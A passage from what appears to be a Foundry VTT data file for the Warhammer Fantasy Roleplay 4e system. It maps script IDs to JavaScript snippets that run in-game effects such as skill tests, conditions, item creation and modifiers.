ui.notifications.warn(`Could not find ${spell}`, {permanent : true})\n  }\n}\n\nupdateObj.name = updateObj.name += \" \" + this.effect.name\n\nawait this.actor.update(updateObj)\nthis.actor.createEmbeddedDocuments(\"Item\", items);\n\n\nfunction equip(item)\n{\n  if (item.type == \"armour\")\n      item.worn = true\n  else if (item.type == \"weapon\")\n      item.equipped = true\n  else if (item.type == \"trapping\" && item.trappingType?.value == \"clothingAccessories\")\n      item.worn = true\n}","wsqNM4NHnwaAAQym":"    args.applyAP = false;\n\n    this.script.scriptNotification(\"This test only applies to criminals, otherwise close the dialog.\");\n    this.actor.setupSkill(game.i18n.localize(\"NAME.Endurance\"), {fields : {difficulty : \"average\"}, skipTargets: true, appendTitle :  ` - ${this.effect.name}`}).then(async test => \n    {\n      await test.roll();\n      if (test.failed)\n      {\n        args.actor.addCondition(\"unconscious\");\n      }\n    });","wyTCozh9qGTx6yK0":"if (args.options.terror || args.extendedTest?.getFlag(\"wfrp4e\", \"fear\"))\n{\n\targs.abort = true;\n\tthis.script.scriptNotification(\"Does not need to make Fear or Terror tests\");\n}","wzkxiKjxVEeNS1di":"let roll = await new Roll(\"1d10\").roll();\nthis.script.scriptMessage(await this.actor.applyBasicDamage(roll.total, {damageType : game.wfrp4e.config.DAMAGE_TYPE.IGNORE_ALL, suppressMsg: true}))\n\nawait this.actor.addCondition(\"deafened\", 3)\n\nlet test = await this.actor.setupSkill(game.i18n.localize(\"NAME.Endurance\"), {fields : {difficulty: \"average\" }, skipTargets: true, appendTitle :  ` - ${this.effect.name}`, context : {failure: \"Gain a Broken Condition\", success : \"Avoided Broken Condition\"}})\nawait test.roll();\nif (test.failed)\n{\n    this.actor.addCondition(\"broken\")\n}","x2RLUUNB7BiIDYCP":"\n                            let difficulty = \"\"\n                            if (this.effect.name.includes(\"Moderate\"))\n                                difficulty = \"easy\"\n                            else if (this.effect.name.includes(\"Severe\"))\n                                difficulty = \"average\"\n                            else\n                                difficulty = \"veasy\"\n        \n                            let test = await this.actor.setupSkill(game.i18n.localize(\"NAME.Endurance\"), {context : {failure : this.actor.name + \" dies from Blight\"}, fields: {difficulty}, skipTargets: true, appendTitle :  \" - Blight\"})\n                            await test.roll();\n                            if (test.failed)\n                            {\n                                this.actor.addCondition(\"dead\");\n                            }\n                            ","x76tKw4L8dX00ikE":"let item = await fromUuid(\"Compendium.wfrp4e-core.items.uqGxFOEqeurwkAO3\")\nlet data = item.toObject();\nfoundry.utils.setProperty(data, \"flags.wfrp4e.breath\", \"fire\")\ndata.system.specification.value = 5\nthis.actor.createEmbeddedDocuments(\"Item\", [data], {fromEffect : this.effect.id})","x8XK2fzzXCnSwfjt":"let test = await this.actor.setupSkill(game.i18n.localize(\"NAME.Athletics\"))\nawait test.roll();\n\nif (test.succeeded)\n{\n\tthis.actor.removeCondition(\"prone\");\n}","x9G6Du5EWV6byf4C":"if (parseInt(this.effect.sourceTest.result.SL) >= 3)\n{\n     this.actor.modifyWounds(this.actor.system.characteristics.t.bonus * 2)\n}\nelse \n{\n   this.actor.modifyWounds(this.actor.system.characteristics.t.bonus)\n}","x9iKFYYc4Ocy8PTS":"let item = this.effect.getCreatedItems()?.[0];\nChatMessage.create({content : \"<em>Grace is beyond style</em>\", speaker : ChatMessage.getSpeaker({token: this.actor.getActiveTokens()[0]?.document, actor: this.actor})}, {chatBubble : true})\n\nlet choice = await ItemDialog.create(ItemDialog.objectToArray({\n    \"nobles\" : \"Nobles\",\n    \"guilders\" : \"Guilders\",\n    \"servants\" : \"Servants\"\n}), 1, \"Choose Group\")\n\nlet name = choice[0]?.name\n\nif (!name)\n{\n    return;\n}\n\nif (item)\n{\n    item.update({\n        name : item.name.split(\"(\")[0] + ` (${name})`, \n        \"system.tests.value\" : item.system.tests.value.split(\"(\")[0] + ` (${name}`\n    })\n}\nelse \n{\n    item = await fromUuid(\"Compendium.wfrp4e-core.items.Item.sYbgpSnRqSZWgwFP\");\n    let data = item.toObject();\n    data.name += ` (${name})`\n    this.actor.createEmbeddedDocuments(\"Item\", [data], {fromEffect: this.effect.id})\n}","xBpLQa7yBPczDMY8":"    let scythe = (await fromUuid(\"Compendium.wfrp4e-core.items.CXg7XOFJwu4LZ9LM\")).toObject();\n    scythe.name = \"Scythe of Shyish\";\n    scythe.system.damage.value = \"WPB + 3\"\n    scythe.system.equipped = true;\n    scythe.img = this.effect.icon;\n    scythe.system.qualities.value.push({name : \"magical\"})\n    this.actor.createEmbeddedDocuments(\"Item\", [scythe], {fromEffect : this.effect.id})","xIRU2SaqLeWmqGDI":"let item = await fromUuid(\"Compendium.wfrp4e-core.items.vMYEkrWj0ip6ZOdv\")\nlet data = item.toObject();\ndata.name += \" (Disease)\"\nthis.actor.createEmbeddedDocuments(\"Item\", [data], {fromEffect : this.effect.id})","xL4S0H1RP8hhXW7c":"let item = await fromUuid(\"Compendium.wfrp4e-core.items.xneBqGOs1QS7kfUr\")\nlet data = item.toObject();\nthis.actor.createEmbeddedDocuments(\"Item\", [data], {fromEffect : this.effect.id})","xLKAuD6yzwjAL6tJ":"return !args.weapon || args.weapon?.system.properties?.qualities.shield || !this.item.system.usesLocation(args.weapon)","xMhhVol8Is3DJ3gb":"if (this.effect.sourceTest.succeeded)\n{\n    let blinded = 1 + this.effect.sourceTest.result.overcast.usage.other.count\n    this.actor.addCondition(\"blinded\", blinded)\n}","xPDMpOvC1ZBVxrNg":"args.fields.modifier += 10;","xPwa3NftkpMBc2AO":"return ![\"ws\", \"s\", \"ag\"].includes(args.characteristic)","xQ3xR2Wf0wHFa76H":"return [\"ws\", \"bs\", \"fel\", \"dex\"].includes(args.characteristic) || args.weapon","xQnoRTHotZKrwPrx":"return args.type == \"cast\" && args.item?.system.lore?.value == \"shadow\"","xRTmMwNfdirjsi8X":"this.actor.addCondition(\"ablaze\");\n\nthis.actor.applyBasicDamage(this.effect.sourceTest.result.damage)","xRd6oA1QWLVpfoBm":"if (!this.actor.has(\"Night Vision\"))\n{\n    let item = await fromUuid(\"Compendium.wfrp4e-core.items.FmHDbCOy3pH8yKhm\");\n    let data = item.toObject();\n    this.actor.createEmbeddedDocuments(\"Item\", [data], {fromEffect : this.effect.id})\n}","xS2su09zcza9du09":"if ([\"Minor\", \"Moderate\", \"Major\"].includes(this.item.system.specification.value))\n{\n\treturn\n}\n\nlet choice = await ItemDialog.create(ItemDialog.objectToArray({minor : \"Minor\", moderate : \"Moderate\", major : \"Major\"}, this.item.img), 1, \"Choose Corruption Severity\");\n\nthis.item.updateSource({\"system.specification.value\" : choice[0]?.name || \"\"})","xUpKYT7BZCSmAfUy":"if (this.item.system.quantity.value)\n{\n\tthis.item.system.reduceQuantity();\n\tlet actor = Array.from(game.user.targets)[0]?.actor || this.actor;\n\tactor.applyEffect({effectData : [this.item.effects.contents[0].convertToApplied()]})\n}\nelse\n{\n\tthis.script.scriptNotification(\"None left!\", \"error\")\n}","xVYVegD692CCv8Yl":"let test = await this.actor.setupSkill(game.i18n.localize(\"NAME.Endurance\"), {fields : {difficulty : \"hard\"}, appendTitle : ` - ${this.effect.name}`})\nawait test.roll();\n\nlet newFortune = Math.max(0, this.actor.status.fortune.value - 1)\nthis.actor.update({ \"system.status.fortune.value\": newFortune  });\n\nif (test.failed)\n{ \n  let char = this.effect.sourceActor.characteristics;\n  let duration = Math.floor((char.wp.initial + char.wp.advances)/10) ;\n  this.script.scriptMessage(\"<strong>Fatethief</strong> has been applied for \" + duration + \" days\"); \n}","xWPgIZOQLba5nZ23":"let nbFatigue = 1 + Number(this.effect.sourceTest.result.SL);\nthis.actor.addCondition(\"fatigued\", nbFatigue);  \n\nlet test = await this.actor.setupSkill(game.i18n.localize(\"NAME.Endurance\"), {fields : {difficulty : \"hard\"}, appendTitle : ` - ${this.effect.name}`})\nawait test.roll();\n\nif (test.succeeded)\n{\n  this.script.scriptNotification(this.actor.name + \"resisted !\")\n}\nelse if (test.failed)\n{\n  this.actor.addCondition(\"unconscious\", 1);\n}","xYTkj8jhSVOSoLbC":"this.actor.flags.useless[this.item.system.location.key[0] + \"Arm\"] = true;","xcy5GOUSZ0meIejZ":"if (args.test.isFumble)\n{\n    args.test.result.other.push(\"@Table[warp-grinder-fumble]\")\n}","xgdhf0wlNP2cHIQx":"await this.actor.addCondition(\"entangled\", this.effect.sourceTest.result.overcast.usage.other.current)","xgplXZMs459X7XXM":"// Apply changes when the mask is worn\n\nif (args.equipped) {  \n  this.actor.createEmbeddedDocuments(\"ActiveEffect\", [this.item.effects.contents[1]?.convertToApplied()])  \n  this.script.scriptMessage(`${this.actor.name} dons the <strong>${this.item.name}</strong>. <br>\n        They suffer –20 to all attempts to resist Disease.<br>\n        If they wear the mask for more than an hour or benefit from any of its effects, they are exposed to @Corruption[moderate]{Moderate Corruption}. \n        `,\n      {whisper: ChatMessage.getWhisperRecipients(\"GM\")}) \n}\n\n// Notify of lingering effects when mask is removed\nelse if (!args.equipped)\n{\n    await this.item.effects.contents[0].delete();\n    await this.item.update({name : this.item.name += \" (Used)\"})\n    this.script.scriptMessage(`<strong>${this.item.name}</strong> on ${this.actor.name} has been taken off and loses its properties. However, the effects last for [[1d10+4]] days, after which they should be manually removed.`, \n    {whisper: ChatMessage.getWhisperRecipients(\"GM\")}\n    )\n    \n}\n","xihniGjgqOhuaKWc":"                 \n                            if (args.test.failed)\n                            {\n                                let applicableCharacteristics = [\"ws\", \"bs\", \"s\", \"fel\", \"ag\", \"t\", \"dex\"];\n                                if (applicableCharacteristics.includes(args.test.characteristicKey))\n                                {\n                                    this.actor.addCondition(\"stunned\");\n                                }\n                            }","xklncIMwQIespDxS":"let test = await this.actor.setupCharacteristic(\"t\", {skipTargets: true, appendTitle :  ` - ${this.effect.name}`, fields : {difficulty : \"vhard\"}});\nawait test.roll();\ngame.wfrp4e.utility.postCorruptionTest(\"minor\", this.script.getChatData())\n\nif (test.failed)\n{\n    this.actor.addCondition(\"unconscious\");\n}","xnHobI9HojObLHMp":"args.applyTB = false;\nargs.applyAP = false;","xobGBJbgFjQCrwvq":"let roll;\nif (this.actor.has(game.i18n.localize(\"NAME.Daemonic\")) || this.actor.has(game.i18n.localize(\"NAME.Undead\")) || [\"Goblin\", \"Orc\", \"Undead\"].includes(this.actor.system.details.species.value))\n{\n    roll = await new Roll(`1d10 + ${this.effect.sourceTest.result.overcast.usage.other.current}`).roll()\n}\nelse \n{\n    roll = await new Roll(`1d10`).roll()\n}\n\nroll.toMessage(this.script.getChatData())\nawait this.actor.applyBasicDamage(roll.total, {damageType : game.wfrp4e.config.DAMAGE_TYPE.IGNORE_ALL, suppressMsg : true})\n\nif (this.actor.has(\"Undead\") || args.actor.has(\"Daemonic\"))\n{\n  this.actor.addCondition(\"ablaze\")\n}","xpgXWoK2zDnG1uiF":"let stunned = args.actor.hasCondition(\"stunned\")\nif (stunned)\n   foundry.utils.setProperty(stunned, \"flags.wfrp4e.scriptData\", foundry.utils.getProperty(stunned, \"flags.wfrp4e.scriptData\").filter(s => s.trigger != \"dialog\"))\n\nlet poisoned= args.actor.hasCondition(\"poisoned\")\nif (poisoned)\n    foundry.utils.setProperty(poisoned, \"flags.wfrp4e.scriptData\", foundry.utils.getProperty(poisoned, \"flags.wfrp4e.scriptData\").filter(s => s.trigger != \"dialog\"))\n\nlet deafened = args.actor.hasCondition(\"deafened\")\nif (deafened)\n    foundry.utils.setProperty(deafened, \"flags.wfrp4e.scriptData\", foundry.utils.getProperty(deafened, \"flags.wfrp4e.scriptData\").filter(s => s.trigger != \"dialog\"))\n\nlet entangled = args.actor.hasCondition(\"entangled\")\nif (entangled)\n    foundry.utils.setProperty(entangled, \"flags.wfrp4e.scriptData\", foundry.utils.getProperty(entangled, \"flags.wfrp4e.scriptData\").filter(s => s.trigger != \"dialog\"))\n\nlet fatigued = args.actor.hasCondition(\"fatigued\")\nif (fatigued)\n    foundry.utils.setProperty(fatigued, \"flags.wfrp4e.scriptData\", foundry.utils.getProperty(fatigued, \"flags.wfrp4e.scriptData\").filter(s => s.trigger != \"dialog\"))\n\nlet blinded = args.actor.hasCondition(\"blinded\")\nif (blinded)\n    foundry.utils.setProperty(blinded, \"flags.wfrp4e.scriptData\", foundry.utils.getProperty(blinded, \"flags.wfrp4e.scriptData\").filter(s => s.trigger != \"dialog\"))\n\nlet broken = args.actor.hasCondition(\"broken\")\nif (broken)\n    foundry.utils.setProperty(broken, \"flags.wfrp4e.scriptData\", foundry.utils.getProperty(broken, \"flags.wfrp4e.scriptData\").filter(s => s.trigger != \"dialog\"))\n\nlet prone= args.actor.hasCondition(\"prone\")\nif (prone)\n    foundry.utils.setProperty(prone, \"flags.wfrp4e.scriptData\", foundry.utils.getProperty(prone, \"flags.wfrp4e.scriptData\").filter(s => s.trigger != \"dialog\"))","xq3RANOtmPhy77ne":"args.update({texture : {tint : \"#FFBF00\"}});","xqWxV9w5ezBQdJkZ":"return args.options.corruption;","xvGxwv7X0Vq3vNqb":"args.fields.modifier -= 10;","xvH4PKJasHcehOZz":"return args.skill?.name == `${game.i18n.localize(\"NAME.Lore\")} (${this.item.parenthesesText})`","y3F1K1sYBymPZCjz":"let characteristics = {\n    \"ws\" : 10,\n    \"bs\" : 0,\n    \"s\" : 5,\n    \"t\" : 0,\n    \"i\" : 5,\n    \"ag\" : 10,\n    \"dex\" : 0,\n    \"int\" : 0,\n    \"wp\" : 0,\n    \"fel\" : 0\n}\nlet skills = [\"Athletics\", \"Animal Care\", \"Language (Battle)\", \"Melee (Basic)\", \"Melee (Cavalry)\", \"Ride\"]\nlet skillAdvancements = [10,10, 10, 10, 10, 20]\n\nlet talents = [\"Roughrider\", \"Strike Mighty Blow\"]\nlet trappings = [\"Hand Weapon\",  \"Shield\", \"Lance\", \"Plate Breastplate\", \"Plate Bracers\", \"Plate Helm\", \"Plate Leggings\"]\nlet specialItems = [ \n    {name: \"Chaos Steed\", type: \"trapping\", trappingType: \"misc\" }, \n]    \nlet items = [];\n\nlet updateObj = this.actor.toObject();\n\nfor (let ch in characteristics)\n{\n    updateObj.system.characteristics[ch].modifier += characteristics[ch];\n}\n\nfor (let item of specialItems) {\n    let newItem\n    if (item.type == \"weapon\") {\n        newItem = new ItemWfrp4e({ name: item.name, type: item.type, system: { equipped: true, damage: {value: item.damage}}  })\n    } else if (item.type == \"trapping\") {\n        newItem = new ItemWfrp4e({ img: \"systems/wfrp4e/icons/blank.png\", name: item.name, type: item.type, system: { worn: true, trappingType: { value: item.trappingType}  } } )\n    } else {\n        newItem = new ItemWfrp4e({ img: \"systems/wfrp4e/icons/blank.png\", name: item.name, type: item.type  })\n    }\n    items.push(newItem.toObject())\n}\n\nfor (let index = 0; index < skills.length; index++)\n{\n    let skill = skills[index]\n    let skillItem;\n    skillItem = updateObj.items.find(i => i.name == skill && i.type == \"skill\")\n    if (skillItem)\n        skillItem.system.advances.value += skillAdvancements[index]\n    else \n    {\n        skillItem = await game.wfrp4e.utility.findSkill(skill)\n        skillItem = skillItem.toObject();\n        skillItem.system.advances.value = skillAdvancements[index];\n        items.push(skillItem);\n    }\n}\n\nfor (let talent of talents)\n{\n    let talentItem = await game.wfrp4e.utility.findTalent(talent)\n    if (talentItem)\n    {\n        items.push(talentItem.toObject());\n    }\n    else \n    {\n        ui.notifications.warn(`Could not find ${talent}`, {permanent : true})\n    }\n}\n\nfor (let trapping of trappings) \n{\n    let trappingItem = await game.wfrp4e.utility.findItem(trapping)\n    if (trappingItem)\n    {\n        trappingItem = trappingItem.toObject()\n\n        equip(trappingItem)\n\n        items.push(trappingItem);\n    }\n    else \n    {\n        ui.notifications.warn(`Could not find ${trapping}`, {permanent : true})\n    }\n}\n\nupdateObj.name = updateObj.name += \" \" + this.effect.name\n\nawait this.actor.update(updateObj)\nconsole.log(\">>>>>>><\", items)\nthis.actor.createEmbeddedDocuments(\"Item\", items);\n\nfunction equip(item)\n{\n    if (item.type == \"armour\")\n        item.system.worn.value = true\n    else if (item.type == \"weapon\")\n        item.system.equipped = true\n    else if (item.type == \"trapping\" && item.system.trappingType.value == \"clothingAccessories\")\n        item.system.worn = true\n}","y3agVFVBR8tVqWyx":"let test = await this.actor.setupCharacteristic(\"wp\", {skipTargets: true, appendTitle :  ` - ${this.effect.name}`});\nawait test.roll();","yAL0YwZWVm8o1nxa":"if (this.actor.hasCondition(\"dead\") && !this.actor.gardenOfCorpses)\n{\n    this.script.scriptMessage(\"[[3d10]] @UUID[Compendium.wfrp4e-core.actors.T79RqnDOAQLn3I1s]{zombies} spring forth from the remains.\", {whisper : ChatMessage.getWhisperRecipients(\"GM\")})\n    this.actor.gardenOfCorpses = true;\n    // local storage is sufficient to prevent multiple messages\n}","yCgH3N9AurIiAv0i":"if (!this.item.name.includes(\"(\") || this.item.system.tests.value.includes(\"(Sense)\") || this.item.system.tests.value.toLowerCase().includes(\"(any)\"))\n{\n    let tests = this.item.system.tests.value\n    let name = this.item.name\n\n    // If name already specifies, make sure tests value reflects that\n    if (name.includes(\"(\") && !name.toLowerCase().includes(\"(any)\"))\n    {\n        let sense = name.split(\"(\")[1].split(\")\")[0]\n        tests = `${tests.split(\"(\")[0].trim()} (${sense})`;\n    }\n    else // If no sense specified, provide dialog choice\n    {\n        let choice = await ItemDialog.create(ItemDialog.objectToArray({\n            taste : \"Taste\",\n            sight : \"Sight\",\n            smell : \"Smell\",\n            hearing : \"Hearing\",\n            touch : \"Touch\"\n        }, this.item.img), 1, \"Choose Sense\");\n        if (choice[0])\n        {\n            name = `${name.split(\"(\")[0].trim()} (${choice[0].name})`\n            tests = `${tests.split(\"(\")[0].trim()} (${choice[0].name})`\n        }\n    }\n\n        this.item.updateSource({name, \"system.tests.value\" : tests})\n}","yDvxF9llUYwJg0sE":"if (getProperty(args.data, \"system.loaded.value\") == true)\n{\n    let repeaterValue = Math.ceil(CONFIG.Dice.randomUniform() * 10);\n    let qualities = foundry.utils.deepClone(this.item.system.qualities.value);\n    let repeater = qualities.find(i => i.name == \"repeater\")\n    if (repeater)\n    {\n        repeater.value = repeaterValue\n    }\n    else \n    {\n        qualities.push({name : \"repeater\", value : repeaterValue})\n    }\n    foundry.utils.setProperty(args.data, \"system.loaded.amt\", repeaterValue)\n    this.item.update({\"system.qualities.value\" : qualities});\n    this.script.scriptNotification(\"Repeater \" + repeaterValue);\n}\nelse if (getProperty(args.data, \"system.loaded.value\") == false)\n{\n   let qualities = foundry.utils.deepClone(this.item.system.qualities.value).filter(i => i.name != \"repeater\");\n   this.item.update({\"system.qualities.value\" : qualities});\n}","yFMvxecXAZ6T2O0S":"if (args.totalWoundLoss >= 1)\n{\n    let roll = await new Roll(\"1d10\").roll();\n    await roll.toMessage(this.script.getChatData());\n    if (roll.total == 9)\n    {\n        this.script.scriptMessage(`Two @UUID[Compendium.wfrp4e-eis.actors.cLOGeMqUty61nYB9]{Blue Horror of Tzeentch} claw their way out of ${this.actor.name}'s screaming flesh, killing them in the process.`, {whisper : ChatMessage.getWhisperRecipients(\"GM\")})\n    }\n}","yIGItnshXI4W46cp":"return args.skill?.name != game.i18n.localize(\"NAME.Charm\");","yMMzZ7daCqRlGT3N":"let item = args.opposedTest.attackerTest.item;\nif (!item.isMagical && (item.type == \"weapon\" || item.type == \"trait\"))\n{\n    args.modifiers.other.push({label : this.effect.name, details : \"Remove Damage Rating\", value : -1 * (args.totalWoundLoss - args.opposedTest.result.differenceSL)})\n}\n","yPxYRObUiqAIhlNB":"this.actor.system.status.encumbrance.max += 1","yRRzSKlcN3L7rEEe":"return args.skill?.name.includes(game.i18n.localize(\"NAME.Entertain\")) || args.skill?.name.includes(game.i18n.localize(\"NAME.Perform\")) || args.skill?.name.includes(game.i18n.localize(\"NAME.Play\"));","yTmRoUstxHMso91c":"if (args.item.name == \"Magic Resistance\" && args.item.type == \"trait\")\n{\n    args.item.system.specification.value = Number(args.item.system.specification.value) + 1\n}","yXUPiWuQ5o0JBY4i":"return args.skill?.name == game.i18n.localize(\"Endurance\") || args.characteristic == \"int\"","yatUu0cd7iKs50rq":"return args.skill?.name != game.i18n.localize(\"NAME.Track\");","ybxDG2ezvRx02LYx":"return !args.options.corruption","ynNCBAYwJFkTiXV1":"this.actor.system.status.addArmour(4, {source : this.effect})","ynV7tz0OdCwlsQp6":"let msg = \"\"\nmsg += `<p>${await this.actor.applyBasicDamage(8, {loc : \"roll\", suppressMsg: true, hideDSN: true})}</p>`\nmsg += `<p>${await this.actor.applyBasicDamage(8, {loc : \"roll\", suppressMsg: true, hideDSN: true})}</p>`\nmsg += `<p>${await this.actor.applyBasicDamage(8, {loc : \"roll\", suppressMsg: true, hideDSN: true})}</p>`\n\nthis.script.scriptMessage(msg);","ynoHNXXCGRS6fTqF":"let msg = \"\"\n\nlet i_gain = (await new Roll(\"1d10\").roll()).total\n\nif (args.actor.characteristics.i.value <= 0)\n{\n   i_gain += (await new Roll(\"2d10\").roll()).total\n}\n\nmsg = `<b>${this.actor.prototypeToken.name}</b> gains ${i_gain} Initiative`\n\nlet newValue = i_gain + args.actor.characteristics.i.modifier\n\nthis.actor.update({\"system.characteristics.i.modifier\" : newValue})\n\n\nlet hitloc = await game.wfrp4e.tables.rollTable(\"hitloc\")\n\nlet value = hitloc.result\nlet desc = hitloc.description\n\nthis.effect.updateSource({\"flags.wfrp4e.location\" : value})\n\nmsg += ` as eyes push out of their ${desc}`\n\nthis.script.scriptMessage(msg)","yzN7ZNlgCiSVJqsU":"let sourceItem = this.effect.sourceItem;\n\nif (sourceItem)\n{\n\tthis.actor.applyEffect({effectUuids : [sourceItem.effects.contents[1].uuid]})\n\tthis.script.scriptNotification(\"Applied after effects\");\n}","z14Tb2YKCjiE5ZTU":"this.actor.getActiveTokens().forEach(t => t.document.update({light : {\n      \"dim\": 30,\n      \"bright\": 20,\n      \"angle\": 90,\n      \"alpha\": 0.6,\n      \"animation\": {\n          \"speed\": 3,\n          \"intensity\": 3,\n          \"type\": \"torch\",\n      },\n      \"color\": \"#ffcc66\",\n  }}));","z5HfNUrHy5MS3K7a":"let test = await this.actor.setupSkill(game.i18n.localize(\"NAME.Cool\"), {skipTargets: true, appendTitle :  ` - ${this.effect.name}`, context : {failure: \"1 Corruption Point Gained\"}})\nawait test.roll();\nif (test.failed && this.actor.type == \"character\")\n{\n    this.actor.update({\"system.status.corruption.value\" : parseInt(this.actor.status.corruption.value) + 1})\n    this.script.scriptMessage(\"Gained a Corruption point\", {whisper : ChatMessage.getWhisperRecipients(\"GM\")})\n}","z8mwLihZQu0JtUHY":"\nlet characteristics = {\n    \"ws\" : 20,\n    \"bs\" : 20,\n    \"s\" : 0,\n    \"t\" : 20,\n    \"i\" : 30,\n    \"ag\" : 0,\n    \"dex\" : 10,\n    \"int\" : 65,\n    \"wp\" : 70,\n    \"fel\" : 20\n}\nlet skills = [\"Channelling\", \"Cool\", \"Intimidate\", \"Language (Magick)\", \"Language (Nehekharan)\", \"Leadership\", \"Lore (Magic)\", \"Perception\"]\nlet skillAdvancements = [20, 30, 25, 30, 20, 20, 30, 20]\nlet talents = [\"Aethyric Attunement\", \"Arcane Magic\", \"Hardy\", \"Instinctive Diction\", \"Magical Sense\", \"Menacing\", \"Menacing\", \"Petty Magic\", \"Read/Write\", \"Second Sight\", \"War Wizard\"]\nlet trappings = [\"Hand Weapon\"]\nlet specialItems = [ \n    {name: \"Mouldering Robes\", type: \"trapping\", trappingType: \"clothingAccessories\" }, \n    {name: \"Pouches containing ritual components\", type: \"trapping\", trappingType: \"clothingAccessories\" }, \n    {name: \"Staff\", type: \"weapon\", damage: \"SB+2\"}, \n    {name: \"Dark Magic (Necromancy)\", type: \"talent\"},\n]    \nlet items = [];\n\nlet updateObj = this.actor.toObject();\n\nfor (let ch in characteristics)\n{\n    updateObj.system.characteristics[ch].modifier += characteristics[ch];\n}\n\nfor (let item of specialItems) {\n    let newItem\n    if (item.type == \"weapon\") {\n        newItem = new ItemWfrp4e({ name: item.name, type: item.type, system: { equipped: true, damage: {value: item.damage}}  })\n    } else if (item.type == \"trapping\") {\n        newItem = new ItemWfrp4e({ img: \"systems/wfrp4e/icons/blank.png\", name: item.name, type: item.type, system: { worn: true, trappingType: { value: item.trappingType}  } } )\n    } else {\n        newItem = new ItemWfrp4e({ img: \"systems/wfrp4e/icons/blank.png\", name: item.name, type: item.type  })\n    }\n    items.push(newItem.toObject())\n}\n\nfor (let index = 0; index < skills.length; index++)\n{\n    let skill = skills[index]\n    let skillItem;\n    skillItem = updateObj.items.find(i => i.name == skill && i.type == \"skill\")\n    if (skillItem)\n        skillItem.system.advances.value += skillAdvancements[index]\n    else \n    {\n        skillItem = await game.wfrp4e.utility.findSkill(skill)\n        skillItem = skillItem.toObject();\n        skillItem.system.advances.value = skillAdvancements[index];\n        items.push(skillItem);\n    }\n}\n\nfor (let talent of talents)\n{\n    let talentItem = await game.wfrp4e.utility.findTalent(talent)\n    if (talentItem)\n    {\n        items.push(talentItem.toObject());\n    }\n    else \n    {\n        ui.notifications.warn(`Could not find ${talent}`, {permanent : true})\n    }\n}\n\nfor (let trapping of trappings) \n{\n    let trappingItem = await game.wfrp4e.utility.findItem(trapping)\n    if (trappingItem)\n    {\n        trappingItem = trappingItem.toObject()\n\n        equip(trappingItem)\n\n        items.push(trappingItem);\n    }\n    else \n    {\n        ui.notifications.warn(`Could not find ${trapping}`, {permanent : true})\n    }\n}\n\nupdateObj.name = updateObj.name += \" \" + this.effect.name\n\nawait this.actor.update(updateObj)\nconsole.log(\">>>>>>><\", items)\nthis.actor.createEmbeddedDocuments(\"Item\", items);\n\nfunction equip(item)\n{\n    if (item.type == \"armour\")\n        item.system.worn.value = true\n    else if (item.type == \"weapon\")\n        item.system.equipped = true\n    else if (item.type == \"trapping\" && item.system.trappingType.value == \"clothingAccessories\")\n        item.system.worn = true\n}","z926Cl2vxUfyLY0V":"if (![\"rArm\", \"lArm\"].includes(this.effect.getFlag(\"wfrp4e\", \"location\")))\n\treturn true\n\nreturn [\"fel\", \"wp\", \"int\", \"t\"].includes(args.characteristic)","z9NEbIUBsKMaTuCz":"if (args.opposedTest.result.hitloc && args.opposedTest.result.hitloc.value == \"head\") \n{\n    args.actor.addCondition(\"entangled\")\n}","zA6TDttpwMSMl7D8":"// An imbiber must take a Consume Alcohol Test.\nthis.actor.setupSkill(game.i18n.localize(\"NAME.ConsumeAlcohol\"), {skipTargets: true, appendTitle :  ` - ${this.effect.name}`}).then(async test => {\n  await test.roll()\n  // If they succeed, \n  // as a result of whatever potential futures they glimpse, \n  // they can spend a Fortune Point within the next hour to reverse the dice of any failed Test.\n  if (test.succeeded) {\n    this.script.scriptMessage(`As a result of whatever potential futures they glimpse, <strong>${this.actor.prototypeToken.name}</strong> can spend a Fortune Point within the next hour to reverse the dice of any failed Test.`, \n    {\n      whisper: ChatMessage.getWhisperRecipients(\"GM\"), \n      blind: true \n    })    \n  }\n})","zBHTIBU8OlYj1YIO":"args.fields.modifier += this.effect.sourceActor?.system.characteristics.wp.value;","zFYCaGR0wbFWjl4T":"return args.skill?.name != game.i18n.localize(\"NAME.OutdoorSurvival\");","zIpl3SkWv8zzlr2D":"let filters = [\n    {\n        property : \"type\",\n        value : \"spell\"\n    },\n    {\n        property : \"system.lore.value\",\n        value : \"petty\"\n    }\n]\n\nlet petty = (await game.wfrp4e.apps.ItemDialog.createFromFilters(filters, 4, \"Choose 4 Petty Spells\")).map(i => i.toObject());\n\n\nfilters = [\n    {\n        property : \"type\",\n        value : \"spell\"\n    },\n    {\n        property : \"system.lore.value\",\n        value : [\"death\"]\n    }\n]\n\nlet arcane = (await game.wfrp4e.apps.ItemDialog.createFromFilters(filters, 8, \"Choose 8 Arcane Spells & Lore of Death\")).map(i => i.toObject());\n\nfilters = [\n    {\n        property : \"type\",\n        value : \"spell\"\n    },\n    {\n        property : \"name\",\n        value: /^((?!\\().)*$/gm, // Remove all spells with parentheses (all arcane spells spells)\n        regex: true\n    },\n    {\n        property : \"system.lore.value\",\n        value : \"necromancy\"\n    }\n]\n\nlet necromancy = (await game.wfrp4e.apps.ItemDialog.createFromFilters(filters, 3, \"Choose 3 from the Lore of Necromancy\")).map(i => i.toObject());\n\nlet items = [...necromancy, ...petty, ...arcane]\n\nthis.actor.createEmbeddedDocuments(\"Item\", items);","zK38Rl5t9zbFi4Se":"if (args.opposedTest.result.hitloc.value == this.item.system.location.key && args.totalWoundLoss > 0)\n{\n    args.actor.addCondition(\"bleeding\", 1);\n    this.script.scriptNotification(\"Added Bleeding\")\n}","zL7ECmBBMAqf5Esn":"let hasMagazine = await Dialog.confirm({content: \"<p>Does the vessel have a magazine or any other kind of store for blackpowder?</p>\"});\n\nif (!hasMagazine) return;\n\nlet roll = new Roll(\"d10\");\nawait roll.evaluate();\n// await roll.toMessage();\nlet anchor = roll.toAnchor();\n\nlet crits = [];\n\nfor (let i = 0; i < roll.total; i++) {\n  let result = await WFRP_Tables.rollTable('crithull');\n  let collection = game.packs.get(result.object.documentCollection)\n\n  if (collection)\n    await collection.getDocuments()\n\n  if (!collection)\n    collection = game.items;\n\n    let item = collection.get(result.object.documentId)\n    if (item)\n      crits.push(item);\n}\n\nconst items = await this.actor.createEmbeddedDocuments(\"Item\", crits);\nconst speaker = ChatMessage.getSpeaker({actor: this.actor});\nconst uuids = items.map(i => `@UUID[${i.uuid}]`);\nthis.script.scriptMessage(`<p><b>${this.item.name}</b> caused an additional ${anchor.outerHTML} Critical Hits to the Hull!</p><ul><li>${uuids.join('<li>')}</ul>`)","zR4WAjzXHTZuiu5G":"let actor = this.actor;\n                            let effect = this.effect;\n                            let bleedingAmt;\n                            let bleedingRoll;\n                            let msg = \"\"\n\n                            let damage = effect.conditionValue;\n                            let scriptArgs = {msg, damage};\n                            await 